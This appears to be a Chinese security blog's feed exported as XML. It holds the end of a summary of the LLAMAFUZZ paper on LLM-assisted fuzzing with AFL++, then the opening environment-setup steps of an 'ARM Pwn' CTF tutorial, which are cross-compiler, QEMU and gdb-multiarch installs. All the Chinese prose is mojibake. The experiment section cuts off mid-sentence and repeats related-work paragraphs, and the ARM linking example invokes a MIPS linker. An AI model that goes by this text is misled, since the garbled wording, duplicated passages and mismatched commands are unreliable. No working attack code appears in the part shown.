å®Œå…¨å˜å¼‚ä»»åŠ¡ã€‚é€šè¿‡å°†é«˜é€Ÿæµ‹è¯•æµç¨‹ä¸ä½é€Ÿ LLM å˜å¼‚è¿‡ç¨‹è§£è€¦ï¼Œåœ¨ä¸æŸå¤±æµ‹è¯•æ•ˆç‡çš„å‰æä¸‹ï¼ŒæˆåŠŸå®ç°äº† LLM å¯¹ fuzzer çš„èƒ½åŠ›å¢å¼ºã€‚</p><h2 id="0x04-å®éªŒ"><a href="#0x04-å®éªŒ" class="headerlink" title="0x04 å®éªŒ"></a>0x04 å®éªŒ</h2><p>è®ºæ–‡æ‰©å±• AFL++ å®ç°äº† LLAMAFUZZï¼Œé€šè¿‡å¼‚æ­¥æ–¹æ³•åœ¨ fuzzers å’Œ LLM ä¹‹é—´è¿›è¡Œé€šä¿¡ã€‚é€šè¿‡ä¿®æ”¹ AFL++ æºä»£ç ä»¥çº³å…¥ LLAMAFUZZ çš„åŠŸèƒ½ï¼Œå¦‚æ¶ˆæ¯é˜Ÿåˆ—å’Œç§å­è¯„ä¼°ã€‚ä¸ºäº†è§£å†³ fuzzer å’Œ LLM ä¹‹é—´çš„ç”Ÿæˆé€Ÿåº¦ä¸åŒ¹é…é—®é¢˜ï¼Œå°†æ¶ˆæ¯é˜Ÿåˆ—é•¿åº¦é™åˆ¶ä¸º 30ã€‚è¿™ç§è°ƒæ•´ç¡®ä¿äº† LLM æ€»æ˜¯åœ¨æœ€è¿‘çš„ç§å­ä¸Šè¿›è¡Œå˜å¼‚ï¼Œä¿æŒäº†å˜å¼‚çš„å®æ—¶æ€§å’Œæœ‰æ•ˆæ€§ã€‚</p><p>ä¸ºäº†æ”¶é›†è¶³å¤Ÿå¤šæ ·çš„å¾®è°ƒæ•°æ®ï¼Œå¹¶æ»¡è¶³ LLM æœ€å¤§ token é™åˆ¶ï¼Œæˆ‘ä»¬å°†åå…­ç¦æ­¢å¯¹çš„æœ€å¤§é•¿åº¦è®¾ç½®ä¸º 4096ã€‚è¿™ä¸ªé™åˆ¶å¯¹åº”äº LLM çš„æœ€å¤§ token å®¹é‡ã€‚</p><p>è®ºæ–‡é€‰æ‹©äº† llama2-7b-chat-hfï¼Œè¿™æ˜¯æœ€å…ˆè¿›çš„ LLM ä¹‹ä¸€ï¼Œåœ¨ç¡¬ä»¶ä¸ŠåŠŸèƒ½å¼ºå¤§ä¸”é«˜æ•ˆã€‚æ ¹æ®ä¹‹å‰çš„å·¥ä½œï¼Œ</p><p>æˆ‘ä»¬å·²ç»è¯æ˜äº† LLAMAFUZZ åœ¨æ ‡å‡†åŸºå‡†æµ‹è¯•å’Œå®é™…ç¨‹åºä¸­çš„ä¼˜è¶Šæ€§ã€‚å±•æœ›æœªæ¥ï¼Œæˆ‘ä»¬æƒ³ç ”ç©¶ LLM å¦‚ä½•å¢å¼º Fuzzing è¿‡ç¨‹ã€‚åœ¨ fuzzing è¿‡ç¨‹ä¸­ï¼Œèƒ½å¤Ÿè§¦å‘æ–°è¡Œä¸ºçš„ç§å­å°†è¢«è§†ä¸ºæœ‰ä»·å€¼çš„ï¼Œå¹¶ç”¨äºè¿›ä¸€æ­¥çš„æ¨¡ç³Šæµ‹è¯•ã€‚å› æ­¤ï¼Œç†è§£è¿™äº›ç§å­ä¸ä»£ç è¦†ç›–ç‡æ”¹è¿›ä¹‹é—´çš„å…³ç³»å¯¹äºä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹è‡³å…³é‡è¦ã€‚ä»¥ç¡®ä¿æµ‹è¯•ç”¨ä¾‹çš„æœ‰æ•ˆæ€§æ¥æµ‹è¯•Cå’Œc++ç¼–è¯‘å™¨ã€‚ç±»ä¼¼åœ°ï¼Œ Csmith[39]ç”Ÿæˆçš„ç¨‹åºè¦†ç›–äº†Cè¯­è¨€çš„å¤§å­é›†ï¼ŒåŒæ—¶é¿å…äº†æœªå®š ä¹‰å’ŒæœªæŒ‡å®šçš„è¡Œä¸ºã€‚</p><p>ç™½ç›’æ¨¡ç³Šå™¨åˆ©ç”¨ç¨‹åºåˆ†ææ¥æé«˜ä»£ç è¦†ç›–ç‡ï¼Œä»¥æ¢ç´¢æŸäº› ä»£ç åŒºåŸŸï¼Œè¿™å¯ä»¥æœ‰æ•ˆåœ°æ­ç¤ºå¤æ‚é€»è¾‘ä¸­çš„æ¼æ´ã€‚WhisperFuzz [2]ä»‹ç»äº†ä¸€ç§é™æ€åˆ†ææ–¹æ³•ï¼Œä¸“é—¨ç”¨äºæ£€æµ‹å’Œå®šä½å¤„ç†å™¨ä¸­çš„ æ—¶åºæ¼æ´ã€‚è¯¥å·¥å…·ä¾§é‡äºè¯„ä¼°å¾®æ¶æ„å®šæ—¶è¡Œä¸ºçš„è¦†ç›–èŒƒå›´ï¼Œæ ä¾›æœ‰é’ˆå¯¹æ€§çš„å…¨é¢è¯„ä¼°ï¼Œæœ‰åŠ©äºè¯†åˆ«ä¸å®šæ—¶ç¼ºé™·ç›¸å…³çš„æ½œåœ¨å®‰ å…¨é£é™©ã€‚</p><p>ç„¶è€Œï¼Œç¨‹åºåˆ†æå’Œå®šä¹‰ä¸“é—¨çš„ç§å­ç”Ÿæˆè¯­æ³•å¯èƒ½éå¸¸è€—æ—¶ã€‚ ç°ç›’æ¨¡ç³Šå™¨ç»“åˆäº†ç™½ç›’æ¨¡ç³Šå™¨çš„æœ‰æ•ˆæ€§å’Œé»‘ç›’æ¨¡ç³Šå™¨çš„æ•ˆç‡ã€‚ å®ƒåˆ©ç”¨ä»ªå™¨ä»ç›®æ ‡ç¨‹åºå’Œé¢†å…ˆçš„fuzzeré‚£é‡Œè·å¾—åé¦ˆï¼Œä»è€Œäº§ç”Ÿ æ›´æœ‰ä»·å€¼çš„ç§å­ï¼Œä»è€Œæé«˜ä»£ç è¦†ç›–ç‡ã€‚ç°ç›’æ¨¡ç³Šå™¨é€šå¸¸ä¸çª å˜ç­–ç•¥ç›¸ç»“åˆï¼Œä¾é å¯¹ç°æœ‰ç§å­çš„è¿­ä»£ä¿®æ”¹æ¥äº§ç”Ÿæ–°çš„æ¨¡ç³Šè¾“ å…¥ã€‚é™¤äº†åŸºæœ¬çªå˜å¤–ï¼Œæœ€è¿‘çš„ç ”ç©¶äººå‘˜è¿˜å¼€å‘äº†å¤æ‚çš„è½¬æ¢æ¥ ä¿æŒç±»å‹ä¸€è‡´æ€§[3,15]ï¼Œå¢åŠ äº†å†å²bugè§¦å‘ä»£ç ç‰‡æ®µ[12,42]å’Œ è¦†ç›–åé¦ˆ[1,9]ï¼Œä»¥æé«˜æµ‹è¯•æ•ˆç‡ã€‚ç¾å›½Fuzzy Lop (AFL)[41]åŠ å…¶å˜ä½“[5,9,20]é‡‡ç”¨å¸¦æœ‰é€‚åº”åº¦å‡½æ•°çš„é—ä¼ ç®—æ³•ï¼Œå¯¹è¿›ä¸€æ­¥çªå˜ çš„æ¨¡ç³Šè¾“å…¥è¿›è¡Œä¼˜å…ˆçº§åˆ’åˆ†ï¼Œä»¥æé«˜è¦†ç›–èŒƒå›´ï¼Œé‡ç‚¹å…³æ³¨å­—èŠ‚çº§å˜åŒ–ã€‚</p><h2 id="0x05-ç›¸å…³å·¥ä½œ"><a href="#0x05-ç›¸å…³å·¥ä½œ" class="headerlink" title="0x05 ç›¸å…³å·¥ä½œ"></a>0x05 ç›¸å…³å·¥ä½œ</h2><h3 id="5-1-Fuzzing"><a href="#5-1-Fuzzing" class="headerlink" title="5.1 Fuzzing"></a>5.1 Fuzzing</h3><p>Fuzzing æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„éšæœºè½¯ä»¶æµ‹è¯•æŠ€æœ¯ï¼Œç”¨äºå‘ç°ç›®æ ‡ç¨‹åº æˆ–åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´å’Œé”™è¯¯ã€‚æ ¹æ®fuzzersæ˜¯å¦äº†è§£ç¨‹åºç»“æ„ï¼Œ ä¼ ç»Ÿçš„fuzzers å¯ä»¥åˆ†ä¸ºé»‘ç›’ fuzzersã€ç™½ç›’ fuzzers å’Œç°ç›’ fuzzersã€‚ é»‘ç›’æ¨¡ç³Šå™¨å¨èƒçš„ç›®æ ‡æ˜¯ä¸€ä¸ªé»‘ç›’å­ï¼Œå®ƒä¸çŸ¥é“ç¨‹åºç»“æ„ã€‚é€š å¸¸ï¼Œé»‘ç›’æ¨¡ç³Šå™¨å› ä¸ºéšæœºç”Ÿæˆæµ‹è¯•è¾“å…¥ï¼Œæ‰€ä»¥æ‰§è¡Œé‡å¾ˆé«˜ï¼Œä½† å®ƒåªè§¦åŠè¡¨é¢ã€‚YARPGen åº”ç”¨éšæœºçªå˜ä¸¥æ ¼åº”ç”¨è¯­è¨€è§„èŒƒï¼Œä»¥ç¡®ä¿æµ‹è¯•ç”¨ä¾‹çš„æœ‰æ•ˆæ€§æ¥æµ‹è¯• C å’Œ C++ ç¼–è¯‘å™¨ã€‚ç±»ä¼¼åœ°ï¼Œ Csmith ç”Ÿæˆçš„ç¨‹åºè¦†ç›–äº† C è¯­è¨€çš„å¤§å­é›†ï¼ŒåŒæ—¶é¿å…äº†æœªå®šä¹‰å’ŒæœªæŒ‡å®šçš„è¡Œä¸ºã€‚</p><p>ç™½ç›’æ¨¡ç³Šå™¨åˆ©ç”¨ç¨‹åºåˆ†ææ¥æé«˜ä»£ç è¦†ç›–ç‡ï¼Œä»¥æ¢ç´¢æŸäº›ä»£ç åŒºåŸŸï¼Œè¿™å¯ä»¥æœ‰æ•ˆåœ°æ­ç¤ºå¤æ‚é€»è¾‘ä¸­çš„æ¼æ´ã€‚WhisperFuzz ä»‹ç»äº†ä¸€ç§é™æ€åˆ†ææ–¹æ³•ï¼Œä¸“é—¨ç”¨äºæ£€æµ‹å’Œå®šä½å¤„ç†å™¨ä¸­çš„æ—¶åºæ¼æ´ã€‚è¯¥å·¥å…·ä¾§é‡äºè¯„ä¼°å¾®æ¶æ„å®šæ—¶è¡Œä¸ºçš„è¦†ç›–èŒƒå›´ï¼Œæä¾›æœ‰é’ˆå¯¹æ€§çš„å…¨é¢è¯„ä¼°ï¼Œæœ‰åŠ©äºè¯†åˆ«ä¸å®šæ—¶ç¼ºé™·ç›¸å…³çš„æ½œåœ¨å®‰ å…¨é£é™©ã€‚</p><p>ç„¶è€Œï¼Œç¨‹åºåˆ†æå’Œå®šä¹‰ä¸“é—¨çš„ç§å­ç”Ÿæˆè¯­æ³•å¯èƒ½éå¸¸è€—æ—¶ã€‚ ç°ç›’æ¨¡ç³Šå™¨ç»“åˆäº†ç™½ç›’æ¨¡ç³Šå™¨çš„æœ‰æ•ˆæ€§å’Œé»‘ç›’æ¨¡ç³Šå™¨çš„æ•ˆç‡ã€‚ å®ƒåˆ©ç”¨ä»ªå™¨ä»ç›®æ ‡ç¨‹åºå’Œé¢†å…ˆçš„fuzzeré‚£é‡Œè·å¾—åé¦ˆï¼Œä»è€Œäº§ç”Ÿ æ›´æœ‰ä»·å€¼çš„ç§å­ï¼Œä»è€Œæé«˜ä»£ç è¦†ç›–ç‡ã€‚ç°ç›’æ¨¡ç³Šå™¨é€šå¸¸ä¸çª å˜ç­–ç•¥ç›¸ç»“åˆï¼Œä¾é å¯¹ç°æœ‰ç§å­çš„è¿­ä»£ä¿®æ”¹æ¥äº§ç”Ÿæ–°çš„æ¨¡ç³Šè¾“ å…¥ã€‚é™¤äº†åŸºæœ¬çªå˜å¤–ï¼Œæœ€è¿‘çš„ç ”ç©¶äººå‘˜è¿˜å¼€å‘äº†å¤æ‚çš„è½¬æ¢æ¥ ä¿æŒç±»å‹ä¸€è‡´æ€§[3,15]ï¼Œå¢åŠ äº†å†å²bugè§¦å‘ä»£ç ç‰‡æ®µå’Œè¦†ç›–åé¦ˆï¼Œä»¥æé«˜æµ‹è¯•æ•ˆç‡ã€‚AFL åŠå…¶å˜ä½“é‡‡ç”¨å¸¦æœ‰é€‚åº”åº¦å‡½æ•°çš„é—ä¼ ç®—æ³•ï¼Œå¯¹è¿›ä¸€æ­¥çªå˜çš„æ¨¡ç³Šè¾“å…¥è¿›è¡Œä¼˜å…ˆçº§åˆ’åˆ†ï¼Œä»¥æé«˜è¦†ç›–èŒƒå›´ï¼Œé‡ç‚¹å…³æ³¨å­—èŠ‚çº§å˜åŒ–ã€‚</p><h3 id="5-2-ç»“æ„ä½“æ•°æ®Fuzzing"><a href="#5-2-ç»“æ„ä½“æ•°æ®Fuzzing" class="headerlink" title="5.2 ç»“æ„ä½“æ•°æ®Fuzzing"></a>5.2 ç»“æ„ä½“æ•°æ®Fuzzing</h3><p>åœ¨éœ€è¦ç»“æ„åŒ–è¾“å…¥çš„åº”ç”¨ç¨‹åºä¸­ï¼Œä¸Šè¿°æ–¹æ³•å¯èƒ½ä¼šåˆ©ç”¨äººå·¥ æ„é€ çš„å­—å…¸æˆ–è‡ªåŠ¨ç”Ÿæˆè¯­æ–™åº“æ¥åˆ›å»ºæ»¡è¶³æ ¼å¼çš„æµ‹è¯•ç”¨ä¾‹ã€‚ ç„¶è€Œï¼Œç›²ç›®éšæœºçªå˜ç­–ç•¥å¾€å¾€ä¼šç ´åæ•°æ®æ ¼å¼çš„ä¸€è‡´æ€§ï¼Œå¯¼ è‡´ç”Ÿæˆå¤§é‡ä½æ•ˆå’Œæ— æ•ˆçš„æµ‹è¯•ç”¨ä¾‹ã€‚</p><p>è¯­æ³•å¼•å¯¼æ¨¡ç³Šå™¨å¯ä»¥å‡†ç¡®è¯†åˆ«ç›®æ ‡è¾“å…¥æ ¼å¼ã€‚å®ƒä»¬å¯ä»¥ ç”Ÿæˆä¿æŒæ ¼å¼ä¸€è‡´æ€§çš„æµ‹è¯•ç”¨ä¾‹ã€‚è¿™ç§æ–¹æ³•ç¡®ä¿ç”Ÿæˆçš„æµ‹è¯• ç”¨ä¾‹ä¸ä»…æ˜¯æœ‰æ•ˆçš„ï¼Œè€Œä¸”åœ¨è§¦å‘å’Œæ¢ç´¢åº”ç”¨ç¨‹åºä¸­çš„æ½œåœ¨æ¼ æ´æˆ–é—®é¢˜æ–¹é¢ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚Langfuzz[12]ç»“åˆäº†åŸºäºè¯­æ³•çš„æ¨¡ ç³Šæµ‹è¯•å’Œé‡ç”¨ç‰¹å®šäºé¡¹ç›®çš„ä¸é—®é¢˜ç›¸å…³çš„ç‰‡æ®µï¼Œä¿æŒäº†æ ¼å¼ çš„å®Œæ•´æ€§ï¼Œå¹¶ä¸”æ¯”éšæœºè¾“å…¥æœ‰æ›´é«˜çš„æœºä¼šå¼•å‘æ–°é—®é¢˜ã€‚ QuickFuzz[10]åˆ©ç”¨äº†Haskellçš„QuickCheckå’ŒHackageæ¥æ¨¡ç³Šç»“ æ„åŒ–æ•°æ®ã€‚è¿™ç§é›†æˆä¸ä¼ ç»Ÿçš„ä½çº§çªå˜æ¨¡ç³Šå™¨ç›¸ç»“åˆï¼Œå¦å®šäº†å¯¹å¤–éƒ¨è¾“å…¥æ–‡ä»¶é›†çš„éœ€ æ±‚ï¼Œå¹¶ä¸”æ¶ˆé™¤äº†ä¸ºè¢«æµ‹è¯•çš„æ–‡ä»¶ç±»å‹å¼€å‘ç‰¹å®šæ¨¡å‹çš„è¦æ±‚ã€‚</p><h3 id="5-3-æœºå™¨å­¦ä¹ å¢å¼ºæ¨¡ç³Šæµ‹è¯•"><a href="#5-3-æœºå™¨å­¦ä¹ å¢å¼ºæ¨¡ç³Šæµ‹è¯•" class="headerlink" title="5.3 æœºå™¨å­¦ä¹ å¢å¼ºæ¨¡ç³Šæµ‹è¯•"></a>5.3 æœºå™¨å­¦ä¹ å¢å¼ºæ¨¡ç³Šæµ‹è¯•</h3><p>ç›®å‰çš„ç ”ç©¶ä¸»è¦é›†ä¸­åœ¨ä¸¤ä¸ªæ–¹é¢ï¼š</p><ul><li>åˆ©ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹ä½œä¸ºç”Ÿæˆå™¨ã€‚</li><li>åˆ©ç”¨æœºå™¨å­¦ä¹ æ¨¡å‹æ¥å¼•å¯¼ Fuzzing è¿‡ç¨‹ã€‚</li></ul><p>C. prez æ¢è®¨äº†å‹ç¼©è¯­è¨€æ¨¡å‹(clm)è§£é‡Šç”±æ ‡å‡†æ–‡ä»¶æ ¼ å‹ç¼©çš„æ–‡ä»¶çš„èƒ½åŠ›ã€‚ä»–ä»¬çš„å‘ç°è¡¨æ˜ï¼Œclmèƒ½å¤Ÿç›´æ¥ä»å­—èŠ‚ æµä¸­ç†è§£å‹ç¼©æ•°æ®çš„è¯­ä¹‰ï¼Œä¸ºå¤„ç†åŸå§‹å‹ç¼©æ–‡ä»¶å¼€è¾Ÿäº†ä¸€æ¡ æ–°é€”å¾„ã€‚åœ¨ä¸€é¡¹ç›¸å…³ç ”ç©¶ä¸­ï¼ŒCHATFUZZ bç ”ç©¶äº†LLM å¯¹åŸºäºæ–‡æœ¬çš„ç§å­çš„çªå˜èƒ½åŠ›ï¼Œæ¯”SOTAç°ç›’æ¨¡ç³Šå™¨(AFL++) å®ç°äº†12.77%çš„è¾¹ç¼˜è¦†ç›–ç‡æé«˜ã€‚ç±»ä¼¼åœ°ï¼ŒSmartSeed ç»“åˆäº†æ·±åº¦å­¦ä¹ æ¨¡å‹æ¥ç”Ÿæˆæ–°çš„è¾“å…¥ï¼Œç”¨äºè¯„ä¼°12ç§ä¸åŒçš„åº” ç”¨ã€‚</p><p>å…ˆå‰çš„å·¥ä½œå°†åŸºäºllmçš„mutatorä¸å¼ºåŒ–å­¦ä¹ æ–¹æ³•é›†æˆåœ¨ ä¸€èµ·ï¼Œåˆ©ç”¨Term Frequency- inverse Document FrequencyæŠ€æœ¯ å¼€å‘åŠ æƒè¦†ç›–å›¾ã€‚è¯¥æ–¹æ³•åˆ©ç”¨è¦†ç›–åé¦ˆæ¥å¢å¼ºçªå˜è¿‡ç¨‹çš„æœ‰ æ•ˆæ€§ã€‚ç±»ä¼¼åœ°ï¼ŒXiaç­‰äººå¼•å…¥äº†ä¸€ä¸ªè‡ªåŠ¨æç¤ºé˜¶æ®µï¼Œè¯¥é˜¶æ®µä½¿ ç”¨llmæ¥è·¨å…­ç§ç¼–ç¨‹è¯­è¨€ç”Ÿæˆå’Œæ”¹å˜æµ‹è¯•ç”¨ä¾‹ã€‚ä»–ä»¬çš„ç ”ç©¶ç»“ æœè¡¨æ˜ï¼Œllmçš„è¦†ç›–èŒƒå›´å¯ä»¥è¶…è¿‡å°–ç«¯å·¥å…·ã€‚</p><p>æ­¤å¤–ï¼ŒWhiteFoxåœ¨å…¶æ¡†æ¶ä¸­ä½¿ç”¨äº†ä¸¤ä¸ªllmï¼š</p><ul><li>ä¸€ä¸ªåˆ†æä½çº§ä¼˜åŒ–æºä»£ç ä»¥é€šçŸ¥ä¼˜åŒ–ç­–ç•¥ï¼Œè€Œå¦ä¸€ä¸ªåŸºäºæ­¤åˆ†æç”Ÿæˆæµ‹è¯•ç¨‹åºã€‚CHATAFLåˆ©ç”¨ llm æ¥ç†è§£åè®®æ¶ˆæ¯ç±»å‹ï¼Œå¹¶è¯„ä¼°å®ƒä»¬åœ¨æœ‰çŠ¶æ€åè®®å®ç°ä¸­è¯†åˆ«â€œçŠ¶æ€â€çš„èƒ½åŠ›ã€‚LLM4FUZZåˆ©ç”¨llmæ¥æŒ‡å¯¼æ¨¡ç³Šæµ‹è¯•äººå‘˜æ›´å®¹æ˜“å‘ç°æ¼æ´çš„æ›´å…³é”®çš„ ä»£ç åŒºåŸŸå’Œè¾“å…¥åºåˆ—ï¼Œå±•ç¤ºäº†llmåœ¨ç¡®å®šä¼˜å…ˆçº§å’Œæ”¹è¿›æ¨¡ç³Šæµ‹ è¯•å·¥ä½œæ–¹é¢çš„æ½œåŠ›ã€‚</li></ul><h2 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h2><p>è¾“å…¥ç§å­å˜å¼‚æ˜¯ç›´æ¥å½±å“æ¨¡ç³Šæµ‹è¯•æ€§èƒ½çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•å…³é”®æ­¥éª¤ã€‚è™½ç„¶éšæœºæ¯”ç‰¹çº§å˜å¼‚åœ¨è®¸å¤šæƒ…å†µä¸‹æœ‰æ•ˆï¼Œä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹åœ¨æµ‹è¯•ç»“æ„åŒ–è¦æ±‚çš„ç›®æ ‡æ—¶é¢ä¸´ç€å·¨å¤§çš„æŒ‘æˆ˜ã€‚è¿™äº›å› ä¸ºå½“å‰åŸºäºå˜å¼‚çš„ fuzzer éœ€è¦æå¤šçš„å°è¯•æ¥å˜å¼‚æœ‰æ•ˆçš„é«˜åº¦ç»“æ„åŒ–æ•°æ®ï¼Œä¸”å˜å¼‚é«˜åº¦ä¾èµ–éšæœºæ€§ã€‚</p><p>æœ¬æ–‡æå‡ºåˆ©ç”¨å¤§è¯­è¨€æ¨¡å‹å­¦ä¹ ç»“æ„åŒ–æ•°æ®çš„æ¨¡å¼å¹¶è¿›è¡Œç§å­å˜å¼‚ã€‚åŸºäºè¯¥ç†è®ºæ„å»ºäº† LLAMAFUZZï¼Œå¹¶è¯æ˜å¤§è¯­è¨€æ¨¡å‹åœ¨ç»“æ„æ„ŸçŸ¥å˜å¼‚ä¸­å…·æœ‰é«˜æ•ˆæ€§å’Œæœ‰æ•ˆæ€§ã€‚</p><p>æˆ‘ä»¬åœ¨æ ‡å‡†æ¨¡ç³Šæµ‹è¯•åŸºå‡† Magma å’Œå¤šç§ç»“æ„åŒ–æ•°æ®çœŸå®ç¨‹åºé›†ä¸Šè¯„ä¼° LLAMAFUZZã€‚ç»“æœéå¸¸æ˜¾è‘—ï¼šä¸å½“å‰æœ€å…ˆè¿›çš„ç°ç›’æ¨¡ç³Šæµ‹è¯•å·¥å…· AFL++ ç›¸æ¯”ï¼ŒLLAMAFUZZ çš„ä»£ç è¦†ç›–ç‡æé«˜äº† 27.19%ã€‚æ­¤å¤–ï¼Œåœ¨æ‰€æœ‰è¯•éªŒä¸­ï¼ŒLLAMAFUZZå¹³å‡å¤šå‘ç° 41 ä¸ªæ¼æ´ï¼Œå¹¶å¤šå‘ç° 47 ä¸ªç‹¬ç‰¹æ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM Pwn</title>
      <link href="/2025/07/01/ctf/heter/arm/"/>
      <url>/2025/07/01/ctf/heter/arm/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>arm æ˜¯ä¸€ç§å¹¿æ³›æ”¯æŒåµŒå…¥å¼ã€ç§»åŠ¨è®¾å¤‡å’ŒæœåŠ¡å™¨ä¸Šçš„å¤„ç†å™¨æ¶æ„ï¼Œå®ƒæ”¯æŒ 32 ä½å’Œ 64 ä½æ¨¡å¼ã€‚arm æ±‡ç¼–æœ‰ä¸åŒçš„æŒ‡ä»¤é›†ï¼Œé’ˆå¯¹ä¸åŒçš„æ¶æ„ï¼ˆARMv7ã€ARMv8ç­‰ï¼‰æœ‰ä¸åŒçš„è¯­æ³•å’Œç‰¹æ€§ã€‚</p><p>ARM æ¶æ„ï¼Œæ›¾ç§°è¿›é˜¶ç²¾ç®€æŒ‡ä»¤é›†æœºå™¨ï¼ˆAdvanced RISC Machineï¼‰æ›´æ—©ç§°ä½œAcorn RISC Machineï¼Œæ˜¯ä¸€ä¸ª32ä½ç²¾ç®€æŒ‡ä»¤é›†ï¼ˆRISCï¼‰å¤„ç†å™¨æ¶æ„ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="ç¼–è¯‘ç¯å¢ƒ"><a href="#ç¼–è¯‘ç¯å¢ƒ" class="headerlink" title="ç¼–è¯‘ç¯å¢ƒ"></a>ç¼–è¯‘ç¯å¢ƒ</h3><ul><li>å®‰è£…ç¼–è¯‘å·¥å…·</li></ul><p>å®‰è£… ARM æ¶æ„äº¤å‰ç¼–è¯‘å·¥å…·</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install gcc-arm-linux-gnueabi binutils-arm-linux-gnueabi <br>sudo apt install gcc-aarch64-linux-gnu binutils-aarch64-linux-gnu <br>sudo apt update<br>sudo apt install gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf<br></code></pre></td></tr></table></figure><ul><li>ç¼–è¯‘æµç¨‹</li></ul><p>å°† arm æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬å…ˆè¦ç¡®å®šéœ€è¦ç¼–è¯‘çš„ç›®æ ‡æ–‡ä»¶ç«¯åºï¼Œç„¶åé€‰æ‹©ç›¸åº”çš„ç¼–è¯‘å·¥å…·ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ä»¥ arm 32 ä½æ¶æ„å°ç«¯åºä¸ºä¾‹ã€‚</p><ol><li>å°†æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸ºç›®æ ‡æ–‡ä»¶</li></ol><p>å› ä¸ºæˆ‘ä»¬éœ€è¦å°†æ±‡ç¼–æ–‡ä»¶ç¼–è¯‘ä¸º arm æ¶æ„å°ç«¯åºçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œé€‰æ‹© arm å³ arm æ¶æ„å°ç«¯åºç¼–è¯‘å·¥å…·ï¼Œé»˜è®¤ä¸º 32 ä½ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">arm-linux-gnueabi-as <span class="hljs-built_in">demo</span>.s -o <span class="hljs-built_in">demo</span>.o<br></code></pre></td></tr></table></figure><ol start="2"><li>é“¾æ¥ç›®æ ‡æ–‡ä»¶</li></ol><p>åŒæ ·é€‰æ‹©ç›¸åº”æ¶æ„çš„é“¾æ¥å™¨è¿›è¡Œé“¾æ¥ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">mipsel-linux-gnu-ld <span class="hljs-built_in">example</span>.o -o <span class="hljs-built_in">example</span><br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ"><a href="#è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ"></a>è¿è¡Œå’Œè°ƒè¯•ç¯å¢ƒ</h3><ul><li>å®‰è£… qemu</li></ul><p>æˆ‘ä»¬é€šè¿‡ qemu æ¥æ¨¡æ‹Ÿè¿è¡Œã€‚qemu æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œå¯ä»¥æ¨¡æ‹Ÿå¤šç§å¤„ç†å™¨æ¶æ„çš„è®¡ç®—æœºç³»ç»Ÿï¼Œè¿™æ˜¯æˆ‘ä»¬å®ç°è·¨å¹³å°è¿è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆå¦‚åœ¨ x86 çš„æœºå­ä¸Šè·‘å…¶å®ƒæ¶æ„ç¨‹åºï¼‰çš„å·¥å…·</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo apt update<br>sudo apt install qemu qemu-<span class="hljs-keyword">user</span> <span class="hljs-title">qemu-system-arm</span> <br></code></pre></td></tr></table></figure><ul><li>è¿œè¡Œæµç¨‹</li></ul><p>æ ¹æ®å¯æ‰§è¡Œæ–‡ä»¶æ¶æ„ï¼Œé€‰æ‹©å¯¹åº”çš„ qemu æ¥è¿è¡Œã€‚</p><p>ä¾‹å¦‚ arm 32ä½å°ç«¯åºæ¶æ„ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹© <code>qemu-arm</code> æ¥è¿è¡Œ</p><p>è¿™é‡Œè¿˜è¦åŒºåˆ†é“¾æ¥æ–¹å¼ï¼Œå¦‚æœåŠ¨æ€é“¾æ¥åˆ™éœ€è¦æŒ‡å®šåŠ¨æ€é“¾æ¥åº“ã€‚</p><p><strong>é™æ€é“¾æ¥ï¼š</strong></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">qemu-arm-<span class="hljs-keyword">static</span> ./demo<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€é“¾æ¥ï¼š</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">qemu</span>-<span class="hljs-meta">arm</span> -L /usr/<span class="hljs-meta">arm</span>-linux-gnu ./demo<br></code></pre></td></tr></table></figure><ul><li>è°ƒè¯•æµç¨‹</li></ul><p>å®‰è£…<code>gdb-multiarch</code>æ¥è°ƒè¯•å¼‚æ¶æ„ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 